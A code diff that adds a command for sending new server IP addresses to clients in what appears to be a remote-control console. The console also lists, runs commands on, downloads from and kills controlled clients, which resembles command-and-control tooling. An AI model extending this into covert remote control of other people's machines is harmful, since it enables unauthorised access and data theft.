@@ -247,6 +247,15 @@ class Control:
                 "controll_client_id": self.id,
             }
         })
+
+    def update_server_ip(self, params: Dict) -> None:
+        self.send_message({
+            "mode": "update_server_ip",
+            "data": {
+                "ips": params["ips"],
+            }
+        })
+
     def input_command(self) -> None:
         help_text = """
 Available commands:
@@ -273,6 +282,9 @@ Available commands:
                     self.print_client_list(self.controlled_client_list)
                 elif command == "/kill_client":
                     self.kill_client(self.controlled_client_list)
+                elif command == "/update_server_ip":
+                    self.update_server_ip(params)
+
                 elif command == "/dir":
                     self._handle_dir_command(params)
                 elif command == "/download":
@@ -281,6 +293,7 @@ Available commands:
                     self._handle_remote_control_command(params)
                 elif command == "/run":
                     self._handle_run_command(params)
+
                 elif command == "/help":
                     print(help_text)
                 else:
